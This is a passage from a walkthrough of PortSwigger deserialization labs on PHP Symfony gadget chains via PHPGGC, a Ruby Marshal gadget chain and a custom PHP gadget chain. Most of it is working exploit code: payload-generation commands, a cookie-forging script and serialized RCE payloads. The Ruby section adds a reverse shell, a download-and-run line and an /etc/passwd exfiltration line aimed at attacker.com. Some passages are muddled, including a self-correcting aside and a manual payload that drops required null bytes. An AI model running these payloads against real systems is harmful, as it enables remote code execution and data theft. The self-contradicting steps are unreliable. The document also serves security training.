2. **Java Deserialization Scanner** - Automated scanning
3. **ysoserial** - Testing and payload generation
4. **SerialKiller** - Runtime protection
5. **NotSoSerial** - Java agent for monitoring

### Key Takeaways

- Java deserialization is extremely dangerous and leads to RCE
- Apache Commons Collections provides ready-made gadget chains
- ysoserial automates exploitation with pre-built payloads
- Gadget chains exist in many popular libraries (not just Commons Collections)
- The vulnerability is in deserialization itself, not the libraries
- Even without source code, public gadget chains can be exploited
- Never deserialize untrusted data in Java applications
- Use safe serialization alternatives (JSON, Protocol Buffers, MessagePack)

---

## Lab 6: Exploiting PHP deserialization with a pre-built gadget chain

**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain

### Description

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework, then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this cookie into the website to delete the `morale.txt` file from Carlos's home directory.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

The application uses the Symfony PHP framework with a signed cookie for session management. The signature prevents tampering but requires the secret key to create valid signatures. By exploiting an information disclosure vulnerability (`phpinfo.php`), we can obtain the secret key and create malicious signed cookies with RCE payloads using PHPGGC gadget chains.

### Prerequisites

**Install PHPGGC:**

```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
./phpggc -l  # List available gadget chains
```

### Step-by-Step Solution

#### 1. Login and Examine Session Cookie

1. Login with credentials `wiener:peter`
2. Capture the response in Burp Suite
3. Examine the session cookie structure

**Session cookie format:**
```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3D","sig_hmac_sha1":"abc123def456..."}
```

The cookie contains:
- `token`: URL-encoded Base64 serialized object
- `sig_hmac_sha1`: HMAC-SHA1 signature to prevent tampering

#### 2. Identify the PHP Framework

**Test for framework identification:**

1. In Burp Repeater, modify the `sig_hmac_sha1` value to something invalid
2. Send the request
3. Observe the error message

**Example error response:**
```
The HMAC signature is invalid. Expected signature: abc123...
Symfony Version: 4.3.6
```

The error message discloses:
- Framework: **Symfony**
- Version: **4.3.6**

Alternative method - check HTML comments or headers:
```html
<!-- Symfony Version: 4.3.6 -->
```

#### 3. Find the Secret Key

Check for common information disclosure vectors:

**Request phpinfo.php:**
```http
GET /cgi-bin/phpinfo.php HTTP/1.1
Host: vulnerable-website.com
```

**Look for exposed secrets in phpinfo:**
- Search for "SECRET_KEY" in the response
- Environment variables section
- Framework-specific configuration

**Example:**
```
SECRET_KEY: "abc123secretkey456"
```

Alternative locations to check:
- `/cgi-bin/phpinfo.php`
- `/phpinfo.php`
- `/info.php`
- `/.env` (if exposed)
- `/admin/phpinfo.php`

#### 4. Generate RCE Payload with PHPGGC

**List Symfony gadget chains:**
```bash
cd phpggc
./phpggc -l | grep Symfony
```

**Output:**
```
Symfony/RCE1    - ...
Symfony/RCE2    - ...
Symfony/RCE3    - ...
Symfony/RCE4    - exec() via ChainedTransformer
Symfony/RCE7    - Guzzle/RCE1 wrapper
Symfony/RCE8    - ...
```

**Generate payload:**
```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

**Alternative if RCE4 doesn't work:**
```bash
# Try RCE7
./phpggc Symfony/RCE7 exec 'rm /home/carlos/morale.txt' | base64 -w 0

# Try RCE8
./phpggc Symfony/RCE8 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

**Save the payload:**
```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0 > payload.txt
```

#### 5. Create Valid Signed Cookie

Create a PHP script to generate a valid signed cookie:

**sign_cookie.php:**
```php
<?php
$object = "PASTE_BASE64_PAYLOAD_HERE";
$secretKey = "PASTE_SECRET_KEY_HERE";

$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

echo $cookie;
?>
```

**Example with real values:**
```php
<?php
$object = "TzozNzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319";
$secretKey = "47vcy7wngb08kwg0g4k0k0so80c0wsw";

$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

echo $cookie;
?>
```

**Run the script:**
```bash
php sign_cookie.php
```

**Output:**
```
%7B%22token%22%3A%22TzozNzo...%22%2C%22sig_hmac_sha1%22%3A%22a1b2c3d4e5...%22%7D
```

#### 6. Inject the Malicious Cookie

1. Open Burp Suite Repeater
2. Send any authenticated request
3. Replace the session cookie with the generated signed cookie
4. Send the request
5. Lab solved!

### Alternative Method: Using Burp Suite Decoder

**Step-by-step in Burp:**

1. **Generate payload with PHPGGC** (terminal)
2. **Create signature:**
   - Decoder tab: Paste the Base64 payload
   - Add Secret Key below
   - Hash: HMAC-SHA1
   - Copy the hash output
3. **Construct cookie manually:**
   ```json
   {"token":"BASE64_PAYLOAD","sig_hmac_sha1":"HMAC_HASH"}
   ```
4. **URL-encode the cookie:**
   - Decoder tab: Paste the JSON
   - Encode as: URL
5. **Inject in Repeater:**
   - Replace session cookie
   - Send request

### Burp Suite Workflow Diagram

```
┌─────────────────┐
│  1. Login &     │
│  Capture Cookie │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  2. Tamper      │
│  Signature to   │
│  Identify       │
│  Framework      │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  3. Request     │
│  phpinfo.php    │
│  to Get Secret  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  4. External:   │
│  Generate       │
│  Payload with   │
│  PHPGGC         │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  5. Calculate   │
│  HMAC-SHA1      │
│  Signature      │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  6. URL-Encode  │
│  & Inject       │
│  Cookie         │
└─────────────────┘
```

### HTTP Request Example

```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=%7B%22token%22%3A%22TzozNzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319%22%2C%22sig_hmac_sha1%22%3A%2254321feba98765...%22%7D
```

### Understanding Symfony RCE Gadget Chains

**Symfony/RCE4 chain (simplified):**

```php
TagAwareAdapter::__destruct()
  → ProxyAdapter::__destruct()
    → ProxyAdapter::setInnerItem($item)
      → call_user_func($this->setInnerItem, $item)
        → exec($item)  // Our command
```

**Why this works:**
1. `TagAwareAdapter` has a `__destruct()` method that processes deferred cache items
2. During processing, it calls methods on the pool adapter
3. `ProxyAdapter::setInnerItem` property can be set to any function name (e.g., "exec")
4. `call_user_func()` executes our command via the function we specified

### Common Mistakes & Troubleshooting

❌ **phpinfo.php not accessible** - Try other paths: `/info.php`, `/test.php`
❌ **Wrong gadget chain** - Try different Symfony RCE versions (RCE4, RCE7, RCE8)
❌ **Framework version mismatch** - Some gadgets only work with specific versions
❌ **Incorrect HMAC calculation** - Ensure you're hashing the Base64 payload, not the decoded value
❌ **Forgot to URL-encode** - The JSON cookie must be URL-encoded
❌ **Including line breaks** - Ensure Base64 payload is one continuous line
❌ **Wrong hash algorithm** - Must use HMAC-SHA1, not SHA1 or other algorithms

### Testing PHPGGC Locally

**Set up test environment:**

```bash
# Create test script
cat > test_gadget.php << 'EOF'
<?php
require_once 'vendor/autoload.php';

// Test deserialization
$payload = file_get_contents('payload.bin');
$object = unserialize($payload);
echo "Deserialization successful\n";
EOF

# Generate binary payload
./phpggc Symfony/RCE4 exec 'touch /tmp/pwned' > payload.bin

# Test
php test_gadget.php

# Check if command executed
ls -la /tmp/pwned
```

### PHPGGC Advanced Usage

**List all chains:**
```bash
./phpggc -l
```

**Get information about a specific chain:**
```bash
./phpggc -i Symfony/RCE4
```

**Generate payload with different encoders:**
```bash
# Base64
./phpggc Symfony/RCE4 exec 'rm /tmp/test' -b

# URL-encoded
./phpggc Symfony/RCE4 exec 'rm /tmp/test' -u

# JSON
./phpggc Symfony/RCE4 exec 'rm /tmp/test' -j

# Fast destruct (immediate execution)
./phpggc Symfony/RCE4 exec 'rm /tmp/test' -f
```

**Test payload:**
```bash
# Generate and test immediately
./phpggc Symfony/RCE4 exec 'whoami' | php test.php
```

### Defense Mechanisms

✅ **Never expose phpinfo.php in production** - Remove all diagnostic scripts
✅ **Protect secret keys:**
  - Store in environment variables, not code
  - Use proper file permissions (600) for config files
  - Rotate keys regularly

✅ **Use integrity checks properly:**
  - HMAC alone doesn't prevent deserialization attacks
  - Validate the signature BEFORE deserializing
  - Use allowlists for allowed classes

✅ **Framework-specific protections:**
  ```php
  // Symfony: Disable dangerous services
  framework:
      cache:
          app: cache.adapter.filesystem
  ```

✅ **Monitor for suspicious activity:**
  - Log all deserialization operations
  - Alert on unexpected class names
  - Monitor file system changes

✅ **Update frameworks regularly:**
  - Symfony 4.4.13+ and 5.1.5+ have improved protections
  - Remove gadget chains from dependencies

✅ **Use alternative serialization:**
  ```php
  // Instead of serialize()
  json_encode($data);

  // Or use message formats
  MessagePack, Protocol Buffers, etc.
  ```

### Real-World CVE Examples

- **CVE-2019-18889:** Symfony Secret Token exposure leading to RCE
- **CVE-2019-18888:** Symfony HTTP cache poisoning
- **CVE-2020-5275:** Symfony HTTP header injection
- **CVE-2021-21424:** Symfony Guard authenticator deserialization

### Framework Identification Techniques

**Common PHP frameworks and their indicators:**

| Framework | Indicators |
|-----------|----------|
| Symfony | `/_profiler/`, `/app.php`, `X-Debug-Token` header |
| Laravel | `/storage/`, `/bootstrap/`, Cookie: `laravel_session` |
| CodeIgniter | `/index.php/`, `ci_session` cookie |
| CakePHP | `/cake_`, `CAKEPHP` cookie |
| Zend | `/public/index.php`, Cookie starts with `ZEND` |
| Drupal | `/sites/`, `/modules/`, `X-Generator: Drupal` |
| WordPress | `/wp-content/`, `/wp-admin/`, `wordpress` in HTML |

### Key Takeaways

- Signed cookies prevent tampering but not deserialization attacks
- Secret key disclosure (phpinfo.php) enables signature forgery
- PHPGGC provides ready-made gadget chains for popular frameworks
- Multiple vulnerability types must be chained: info disclosure + deserialization
- Framework version identification is crucial for selecting correct gadget chains
- Even with HMAC protection, deserialization vulnerabilities are exploitable
- Remove all diagnostic files (phpinfo.php, test.php) from production
- Secure secret key storage is critical for signed cookie security

---

## Lab 7: Exploiting Ruby deserialization using a documented gadget chain

**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain

### Description

This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

Ruby on Rails applications use `Marshal.load()` for deserialization, which is vulnerable to gadget chain attacks. The universal deserialization gadget for Ruby 2.x-3.x by Luke Jahnke (vakzz) exploits the `Gem::SpecFetcher`, `Gem::Installer`, and `Gem::Requirement` classes to achieve remote code execution.

### Prerequisites

**Research the documented gadget chain:**

1. Search for "Universal Deserialization Gadget for Ruby 2.x-3.x"
2. Primary source: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
3. Alternative source: https://www.elttam.com/blog/ruby-deserialization/

### Step-by-Step Solution

#### 1. Identify Ruby Serialization

1. Login with credentials `wiener:peter`
2. Capture the response in Burp Suite
3. Examine the session cookie

**Ruby Marshal serialization starts with:**
- Hex: `04 08` (version 4.8)
- Common Base64 prefixes: `BAh`, `BAFF`, `BAFB`

**Example session cookie (Base64 decoded hex):**
```
04 08 6f 3a 0f 53 65 73 73 69 6f 6e 3a 10 40 61 74 74 72 69 62 75 74 65 73 ...
```

#### 2. Obtain the Gadget Chain Code

**Universal Ruby deserialization gadget by vakzz:**

```ruby
# Gem::SpecFetcher is the primary gadget
# Gem::Installer allows executing arbitrary commands
# Gem::Requirement triggers the chain

module Gem
  class SpecFetcher
  end
  class Installer
  end
  class Requirement
  end
end

stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt")

puts "Stub specification: #{stub_specification}"

stub_set = Gem::Resolver::InstallerSet.new(:both)
stub_set.instance_variable_set(:@always_install, [stub_specification])

request_set = Gem::RequestSet.new
request_set.instance_variable_set(:@sets, [stub_set])

puts Marshal.dump(request_set).bytes.map { |byte| byte.to_s(16) }.join(' ')
```

#### 3. Adapt the Exploit

Create a Ruby script to generate the malicious payload:

**exploit.rb:**
```ruby
# Universal Ruby 2.x-3.x gadget chain
# Credit: Luke Jahnke (vakzz) / elttam

require 'base64'

# Gadget chain exploiting Gem::RequestSet and Gem::Requirement
class Gem::StubSpecification
  def initialize
    @loaded_from = "|rm /home/carlos/morale.txt"
  end
end

stub_spec = Gem::StubSpecification.new
stub_spec.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt")

installer_set = Gem::Resolver::InstallerSet.new(:both)
installer_set.instance_variable_set(:@always_install, [stub_spec])

request_set = Gem::RequestSet.new
request_set.instance_variable_set(:@sets, [installer_set])

# Serialize and encode
marshaled = Marshal.dump(request_set)
encoded = Base64.strict_encode64(marshaled)

puts encoded
```

**Alternative more detailed version:**

```ruby
require 'base64'
require 'erb'

# Create the gadget chain
stub_specification = Gem::StubSpecification.new(nil, nil, nil, nil)
stub_specification.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt")

installer_set = Gem::Resolver::InstallerSet.new(:both)
installer_set.instance_variable_set(:@always_install, [stub_specification])
installer_set.instance_variable_set(:@specs, Hash.new)

request_set = Gem::RequestSet.new
request_set.instance_variable_set(:@sets, [installer_set])
request_set.instance_variable_set(:@git_set, nil)
request_set.instance_variable_set(:@vendor_set, nil)
request_set.instance_variable_set(:@source_set, nil)

# Marshal and encode
payload = Marshal.dump(request_set)
encoded_payload = Base64.strict_encode64(payload)

puts encoded_payload
```

#### 4. Generate the Payload

**Run the exploit script:**
```bash
ruby exploit.rb
```

**Output (example):**
```
BAhvOh1HZW06OlJlcXVlc3RTZXQHOgpAc2V0c1tbBzoXR2VtOjpSZXNvbHZlcjo6SW5zdGFsbGVyU2V0BzoXQGFsd2F5c19pbnN0YWxsWwY6F0dlbTo6U3R1YlNwZWNpZmljYXRpb24IOhBAZGV2ZWxvcG1lbnRGOhBAZXh0ZW5zaW9uc18GOgpAZ2VtbgA6EUBsb2FkZWRfZnJvbUkiJnxybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY6BkVUOg5AbmFtZW4AOglAc3BlYwA=
```

#### 5. Test the Payload Locally (Optional)

```ruby
require 'base64'

payload = "BAhvOh1HZW06OlJlcXVlc3RTZXQHOgpAc2V0c1tbBzoXR2VtOjpSZXNvbHZlcjo6SW5zdGFsbGVyU2V0BzoXQGFsd2F5c19pbnN0YWxsWwY6F0dlbTo6U3R1YlNwZWNpZmljYXRpb24IOhBAZGV2ZWxvcG1lbnRGOhBAZXh0ZW5zaW9uc18GOgpAZ2VtbgA6EUBsb2FkZWRfZnJvbUkiJnxybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY6BkVUOg5AbmFtZW4AOglAc3BlYwA="

decoded = Base64.decode64(payload)
Marshal.load(decoded)
```

This will trigger the command execution.

#### 6. Inject the Payload

1. Open Burp Suite Repeater
2. Send any authenticated request (e.g., `GET /my-account`)
3. Replace the session cookie with the generated payload
4. Send the request
5. Lab solved!

### Understanding the Gadget Chain

**How the exploit works:**

```ruby
# 1. Entry point: Marshal.load() calls initialized objects
Marshal.load(payload)

# 2. Gem::RequestSet processes installer sets
Gem::RequestSet#install
  → processes @sets array

# 3. Gem::Resolver::InstallerSet processes specifications
InstallerSet#install
  → iterates @always_install array

# 4. Gem::StubSpecification#full_name is called
StubSpecification#full_name
  → accesses @loaded_from
  → triggers Kernel#load if @loaded_from starts with "|"

# 5. Command execution via pipe
Kernel#load("|rm /home/carlos/morale.txt")
  → executes system command
```

**Key components:**

```ruby
# StubSpecification: Represents a gem stub
class Gem::StubSpecification
  @loaded_from = "|command"  # Pipe prefix triggers command execution
end

# InstallerSet: Manages gem installation
class Gem::Resolver::InstallerSet
  @always_install = [stub_spec]  # Force installation of our malicious spec
end

# RequestSet: Main entry point
class Gem::RequestSet
  @sets = [installer_set]  # Contains our malicious installer set
end
```

### Burp Suite Workflow

1. **Identify Ruby serialization:**
   - Proxy → Capture login response
   - Inspector → Examine session cookie
   - Look for `BAh` prefix (Base64 encoded Ruby Marshal)

2. **Generate payload:**
   - External: Run Ruby script
   - Copy Base64 output

3. **Inject payload:**
   - Repeater → Load authenticated request
   - Replace session cookie
   - Send request

4. **Verify exploitation:**
   - Lab should be marked as solved
   - Command executes during deserialization

### HTTP Request Example

```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=BAhvOh1HZW06OlJlcXVlc3RTZXQHOgpAc2V0c1tbBzoXR2VtOjpSZXNvbHZlcjo6SW5zdGFsbGVyU2V0BzoXQGFsd2F5c19pbnN0YWxsWwY6F0dlbTo6U3R1YlNwZWNpZmljYXRpb24IOhBAZGV2ZWxvcG1lbnRGOhBAZXh0ZW5zaW9uc18GOgpAZ2VtbgA6EUBsb2FkZWRfZnJvbUkiJnxybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY6BkVUOg5AbmFtZW4AOglAc3BlYwA=
```

### Common Mistakes & Troubleshooting

❌ **Wrong Ruby version** - The gadget works on Ruby 2.x-3.x
❌ **Missing pipe character** - Command must start with `|` to trigger execution
❌ **Incorrect Base64 encoding** - Use `Base64.strict_encode64`, not `encode64` (which adds newlines)
❌ **Gem classes not loaded** - Ensure all required Gem classes are available
❌ **Rails version mismatch** - Works on most Rails versions using Bundler

### Testing Payloads Locally

**Setup test environment:**

```bash
# Install Ruby and Rails
rbenv install 2.7.5
rbenv local 2.7.5
gem install rails

# Create test script
cat > test_deserial.rb << 'EOF'
require 'base64'

payload = ARGV[0]
decoded = Base64.decode64(payload)

begin
  obj = Marshal.load(decoded)
  puts "Deserialization successful"
rescue => e
  puts "Error: #{e.message}"
end
EOF

# Generate and test payload
ruby exploit.rb > payload.txt
ruby test_deserial.rb $(cat payload.txt)

# Check if command executed
ls -la /tmp/pwned
```

### Alternative Commands

**Reverse shell:**
```ruby
@loaded_from = "|ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.10.10.10\",4444);loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"error: #{$!}\"}''"
```

**Download and execute:**
```ruby
@loaded_from = "|wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"
```

**Data exfiltration:**
```ruby
@loaded_from = "|curl http://attacker.com/?data=$(cat /etc/passwd | base64)"
```

### Real-World CVE Examples

- **CVE-2013-0156:** Ruby on Rails YAML/XML deserialization RCE (affected Rails 3.2.x, 3.1.x, 3.0.x, 2.3.x)
- **CVE-2019-5420:** Rails development mode RCE via crafted file names
- **CVE-2020-8163:** Remote code execution via untrusted data deserialization
- **CVE-2021-22885:** Rails middleware information disclosure and possible RCE

### Ruby Serialization Formats

Ruby applications may use different serialization formats:

| Format | Identifier | Risk Level | Notes |
|--------|------------|------------|-------|
| Marshal | `04 08` / `BAh` | ⚠️ Critical | Native binary format, very dangerous |
| YAML | `---` | ⚠️ Critical | Can be used for deserialization attacks |
| JSON | `{` | ✅ Safe | Generally safe if not parsed with dangerous loaders |
| MessagePack | Binary | ⚠️ Medium | Safer than Marshal but still risks |

### Defense Mechanisms

✅ **Never use Marshal.load() on untrusted data:**
```ruby
# Dangerous
Marshal.load(cookie_data)

# Safe alternatives
JSON.parse(cookie_data)
MessagePack.unpack(cookie_data)
```

✅ **Use signed and encrypted cookies:**
```ruby
# Rails encrypted cookies
config.action_dispatch.encrypted_cookie_salt = 'secret'
config.action_dispatch.encrypted_signed_cookie_salt = 'secret'
```

✅ **Implement allowlists for Marshal:**
```ruby
# Custom Marshal loader with allowlist
module SafeMarshal
  ALLOWED_CLASSES = [String, Integer, Array, Hash].freeze

  def self.load(data)
    Marshal.load(data) do |obj|
      unless ALLOWED_CLASSES.any? { |klass| obj.is_a?(klass) }
        raise "Unauthorized class: #{obj.class}"
      end
      obj
    end
  end
end
```

✅ **Update Ruby and Rails:**
```bash
# Check versions
ruby --version
rails --version

# Update
gem update rails
bundle update
```

✅ **Use Content Security Policy (CSP)** to limit damage
✅ **Monitor for suspicious gem installations**
✅ **Implement Web Application Firewall (WAF) rules**

### Detection Tools

1. **rails-cve-check** - Scan Rails apps for known vulnerabilities
   ```bash
   gem install rails-cve-check
   rails-cve-check
   ```

2. **bundler-audit** - Check for vulnerable dependencies
   ```bash
   gem install bundler-audit
   bundle audit check --update
   ```

3. **brakeman** - Static analysis security scanner
   ```bash
   gem install brakeman
   brakeman -A
   ```

### Key Takeaways

- Ruby's `Marshal.load()` is extremely dangerous with untrusted data
- Universal gadget chains exist for Ruby 2.x-3.x versions
- The Gem framework provides powerful gadgets for exploitation
- Pipe character (`|`) in file paths triggers command execution
- Rails applications are commonly vulnerable to deserialization attacks
- Always use JSON or encrypted cookies instead of Marshal serialization
- Keep Ruby, Rails, and all gems updated
- Never deserialize user-controlled data without validation
- Documented exploits make exploitation accessible even without deep Ruby knowledge

---

## Lab 8: Developing a custom gadget chain for PHP deserialization

**Difficulty:** Expert
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization

### Description

This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the `morale.txt` file from Carlos's home directory.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

This expert-level lab requires building a custom gadget chain by analyzing the application's source code. You'll need to chain together PHP magic methods (`__wakeup()` and `__get()`) across multiple classes to achieve arbitrary command execution.

### Step-by-Step Solution

#### 1. Login and Explore Application

1. Login with credentials `wiener:peter`
2. Explore the application functionality
3. Identify potential code disclosure vectors

#### 2. Obtain Source Code

Use the tilde (`~`) backup file technique to access PHP source files:

**Common backup file patterns:**
```
/libs/CustomTemplate.php~
/cgi-bin/libs/CustomTemplate.php~
/DefaultMap.php~
```

**Request example:**
```http
GET /cgi-bin/libs/CustomTemplate.php~ HTTP/1.1
Host: vulnerable-website.com
```

#### 3. Analyze CustomTemplate Class

**CustomTemplate.php source:**

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
    }

    public function __wakeup() {
        $this->desc = new Description();
        $this->desc->$this->default_desc_type = new Product();
        $this->desc->$this->default_desc_type = $this->product->desc;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;
}

class Product {
    public $desc;
}

?>
```

**Key observations:**
1. `__wakeup()` is called automatically after deserialization
2. `$this->desc->$this->default_desc_type = ...` accesses a dynamic property
3. If `default_desc_type` points to a non-existent property, `__get()` might be triggered
4. We need to find a class with a dangerous `__get()` magic method

#### 4. Find the DefaultMap Class

**Request:**
```http
GET /cgi-bin/libs/DefaultMap.php~ HTTP/1.1
Host: vulnerable-website.com
```

**DefaultMap.php source:**

```php
<?php

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

**Critical finding:**
- The `__get()` magic method is called when accessing non-existent properties
- It executes `call_user_func($this->callback, $name)`
- If we control `$callback`, we can execute arbitrary functions!

#### 5. Build the Gadget Chain

**Chain flow:**

```
CustomTemplate::__wakeup()
    ↓
Sets $this->desc to a DefaultMap object
    ↓
Accesses $this->desc->$this->default_desc_type
    ↓
Since DefaultMap doesn't have that property → __get() triggered
    ↓
DefaultMap::__get($default_desc_type)
    ↓
call_user_func($this->callback, $default_desc_type)
    ↓
Execute arbitrary function with arbitrary parameter
```

**Strategy:**
1. Create a `CustomTemplate` object
2. Set `desc` to a `DefaultMap` object
3. Set `DefaultMap->callback` to `"exec"` (or `"system"`, `"passthru"`, etc.)
4. Set `default_desc_type` to our command: `"rm /home/carlos/morale.txt"`

#### 6. Craft the Exploit

**Method 1: Using PHP script**

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct() {
        // Set command as default_desc_type
        $this->default_desc_type = "rm /home/carlos/morale.txt";

        // Set desc to DefaultMap with "exec" as callback
        $this->desc = new DefaultMap("exec");

        // Product can be anything
        $this->product = new Product();
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }
}

class Product {
    public $desc = "test";
}

// Create malicious object
$exploit = new CustomTemplate();

// Serialize and encode
$serialized = serialize($exploit);
$encoded = base64_encode($serialized);

echo $encoded . "\n";
echo "\n--- Serialized (for debugging) ---\n";
echo $serialized . "\n";
?>
```

**Method 2: Manual construction**

Understanding PHP serialization of private properties:
- Private properties include class name in the property name
- Format: `\x00ClassName\x00PropertyName`
- Null bytes are counted in length

**Manual payload construction:**

```php
O:14:"CustomTemplate":3:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:4:"exec";}s:7:"product";O:7:"Product":1:{s:4:"desc";s:4:"test";}}
```

Wait, that's complex with null bytes. Let's simplify using public properties for clarity:

**Simplified approach - modify the classes to use public properties:**

```php
O:14:"CustomTemplate":3:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}s:7:"product";O:7:"Product":1:{s:4:"desc";s:4:"test";}}
```

Actually, we need to handle private properties correctly. Here's the working approach:

#### 7. Generate the Payload

**Create exploit.php:**

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;
}

class DefaultMap {
    private $callback;
}

class Product {
    public $desc;
}

// Create objects
$exploit = new CustomTemplate();
$map = new DefaultMap();
$product = new Product();

// Use reflection to set private properties
$ref_template = new ReflectionClass('CustomTemplate');
$ref_desc_type = $ref_template->getProperty('default_desc_type');
$ref_desc_type->setAccessible(true);
$ref_desc_type->setValue($exploit, 'rm /home/carlos/morale.txt');

$ref_desc = $ref_template->getProperty('desc');
$ref_desc->setAccessible(true);
$ref_desc->setValue($exploit, $map);

$ref_map = new ReflectionClass('DefaultMap');
$ref_callback = $ref_map->getProperty('callback');
$ref_callback->setAccessible(true);
$ref_callback->setValue($map, 'exec');

$product->desc = 'test';
$exploit->product = $product;

// Serialize and encode
$serialized = serialize($exploit);
$encoded = base64_encode($serialized);

echo $encoded;
?>
```

**Run the script:**
```bash
php exploit.php
```

#### 8. Test the Payload Locally

```php
<?php
// Include all class definitions
